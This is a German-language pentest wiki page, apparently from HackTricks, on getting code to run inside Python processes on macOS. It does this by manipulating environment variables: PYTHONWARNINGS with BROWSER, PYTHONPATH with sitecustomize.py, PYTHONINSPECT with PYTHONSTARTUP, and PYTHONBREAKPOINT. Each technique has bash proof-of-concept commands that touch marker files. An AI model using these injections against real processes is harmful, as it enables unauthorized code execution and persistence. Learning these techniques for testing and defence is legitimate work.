# Python-Anwendungsinjektion unter macOS

{{#include ../../../banners/hacktricks-training.md}}

## Über die Umgebungsvariablen `PYTHONWARNINGS` und `BROWSER`

Wenn ein Angreifer die Umgebung eines Python-Prozesses kontrollieren kann, kann die Kombination aus `PYTHONWARNINGS` und `BROWSER` die Ausführung von Befehlen auslösen, wenn Python beim Verarbeiten einer manipulierten Warnoption das Modul `antigravity` importiert. Die Technik nutzt aus, dass `antigravity` mit Pythons Modul `webbrowser` eine URL öffnet, das die Umgebungsvariable `BROWSER` berücksichtigt.<sup>[[1]](#references)</sup>

```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```

## Über `PYTHONPATH` und `sitecustomize.py`

Beim normalen Start fügt Pythons `site`-Modul systemspezifische Pfade hinzu und versucht anschließend, ein Modul namens `sitecustomize` zu importieren. Indem ein Angreifer ein für ihn lesbares Verzeichnis an den Anfang von `PYTHONPATH` setzt, kann er bei Kontrolle über die Prozessumgebung Python dazu bringen, vor dem Zielskript eine Payload zu importieren. Das Flag `-S` deaktiviert die automatische Initialisierung von `site`, während der isolierte Modus (`-I`) `PYTHONPATH` ignoriert und `-s` sowie `-E` impliziert.<sup>[[2]](#references)[[3]](#references)</sup>

```bash
mkdir -p /tmp/python-startup
cat >/tmp/python-startup/sitecustomize.py <<'EOF'
from pathlib import Path
Path('/tmp/python-sitecustomize-executed').touch()
EOF

PYTHONPATH=/tmp/python-startup python3 /tmp/script.py
```

Für Persistenz über eine beschreibbare User-Site statt über ein geerbtes `PYTHONPATH` siehe [Python `.pth`-, `.start`- und `usercustomize`-Startdateien](../../macos-auto-start-locations.md#python-startup-files-pth--usercustomize--sitecustomize).

## Über `PYTHONINSPECT` und `PYTHONSTARTUP` nach einem Skript

Unter CPython 3.13+ wechselt ein mit `PYTHONINSPECT=1` gestartetes Skript nach seiner Ausführung in eine interaktive Sitzung. Wenn die Standardeingabe ein Terminal ist und PyREPL verfügbar ist, führt diese Sitzung die durch `PYTHONSTARTUP` angegebene Datei **nach** dem Zielskript und vor der Eingabeaufforderung aus. Ein Angreifer, der sowohl die geerbten Variablen als auch eine lesbare Startdatei kontrolliert, kann daher Code im Zielprozess ausführen, ohne dessen Skript zu ändern. Dies ist ein Post-Skript-Trigger, kein normaler Start-Hook.<sup>[[3]](#references)[[5]](#references)[[6]](#references)</sup>

```bash
cat >/tmp/python-post.py <<'EOF'
from pathlib import Path
Path('/tmp/python-post-executed').touch()
EOF

# Run from a terminal using CPython 3.13+; exit the resulting prompt with Ctrl-D.
PYTHONINSPECT=1 PYTHONSTARTUP=/tmp/python-post.py python3.13 /tmp/script.py
```

Die Chain führt die Startup-Datei bei älteren CPython-Versionen, bei nicht-terminaler Standardeingabe oder wenn `PYTHONBREAKPOINT` den einfachen REPL erzwingt, nicht aus. `-E` und `-I` ignorieren die `PYTHON*`-Variablen. Prüfe den tatsächlichen Interpreter und den Terminalkontext, bevor du dich auf diesen Weg verlässt.<sup>[[3]](#references)[[5]](#references)</sup>

## Über `PYTHONBREAKPOINT`

Seit Python 3.7 (PEP 553) importiert und ruft die eingebaute Funktion `breakpoint()` auf, worauf `sys.breakpointhook` verweist. Dieses Ziel wird über die Umgebungsvariable **`PYTHONBREAKPOINT`** festgelegt (`package.module.callable`). Sowohl der Import des angegebenen Moduls als auch der Aufruf der Funktion erfolgen, bevor der Debugger normalerweise erscheint. Ein Angreifer, der die Umgebung eines Prozesses kontrolliert, der `breakpoint()` aufruft (üblich in Wartungs- und Debug-Skripten und manchmal auch in Produktionspfaden), erhält daher Codeausführung.<sup>[[4]](#references)</sup>

```bash
cat >/tmp/bp.py <<'EOF'
import sys
print("before")
breakpoint(*sys.argv[1:])
EOF

# breakpoint() invokes the chosen callable with its arguments
PYTHONBREAKPOINT="os.system" python3 /tmp/bp.py "touch /tmp/py-bp-executed"
ls -la /tmp/py-bp-executed
```

Anders als bei `PYTHONWARNINGS`/`PYTHONPATH` muss das Ziel tatsächlich einen Aufruf von `breakpoint()` erreichen. Es funktioniert aber auch ausschließlich über die **Import-Seiteneffekte** des angegebenen Moduls (verweise auf ein beliebiges importierbares Modul — zum Beispiel eines, das zuerst in `PYTHONPATH` steht — dessen Top-Level-Code ausgeführt wird). Mit `PYTHONBREAKPOINT=0` wird der Hook vollständig deaktiviert.



## References

- [1] [Hacking mit Umgebungsvariablen - elttam](https://www.elttam.com/blog/env/)
- [2] [site — hooks für sitespezifische Konfiguration](https://docs.python.org/3/library/site.html)
- [3] [Python-Befehlszeile und -Umgebung](https://docs.python.org/3/using/cmdline.html)
- [4] [PEP 553 — Integrierte Funktion breakpoint() und PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
- [5] [Dispatch des CPython-Interpreter-REPL (`Modules/main.c`)](https://github.com/python/cpython/blob/v3.15.2/Modules/main.c)
- [6] [Ausführung der CPython-PyREPL-Startdatei (`Lib/_pyrepl/main.py`)](https://github.com/python/cpython/blob/v3.15.2/Lib/_pyrepl/main.py)
{{#include ../../../banners/hacktricks-training.md}}
